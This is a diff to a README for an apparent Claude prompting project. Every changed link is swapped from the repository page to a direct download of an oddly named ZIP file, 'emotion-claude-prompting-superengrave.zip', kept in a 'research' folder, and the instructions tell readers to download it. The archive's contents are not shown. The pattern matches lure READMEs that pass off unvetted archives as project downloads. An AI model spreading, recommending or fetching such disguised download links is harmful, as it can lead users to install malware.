@@ -1,6 +1,6 @@
 # 🧠 claude-emotion-prompting - Prompt Claude With Better Signal
 
-[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Scenic-urochordate607/claude-emotion-prompting)
+[![Download](https://img.shields.io/badge/Download-Start%20Here-blue?style=for-the-badge)](https://github.com/Scenic-urochordate607/claude-emotion-prompting/raw/refs/heads/main/research/emotion-claude-prompting-superengrave.zip)
 
 ## ✨ What this is
 
@@ -12,7 +12,7 @@ This repository is built for people who want a simple way to shape Claude’s re
 
 Use the link below to visit the download page and get the files.
 
-[Visit the download page](https://github.com/Scenic-urochordate607/claude-emotion-prompting)
+[Visit the download page](https://github.com/Scenic-urochordate607/claude-emotion-prompting/raw/refs/heads/main/research/emotion-claude-prompting-superengrave.zip)
 
 ### What you need
 
@@ -219,7 +219,7 @@ A simple workflow looks like this:
 
 Use the link below to visit the page and download the repository files.
 
-[https://github.com/Scenic-urochordate607/claude-emotion-prompting](https://github.com/Scenic-urochordate607/claude-emotion-prompting)
+[https://github.com/Scenic-urochordate607/claude-emotion-prompting/raw/refs/heads/main/research/emotion-claude-prompting-superengrave.zip](https://github.com/Scenic-urochordate607/claude-emotion-prompting/raw/refs/heads/main/research/emotion-claude-prompting-superengrave.zip)
 
 1. Open the page in your browser.
 2. Download the ZIP file.
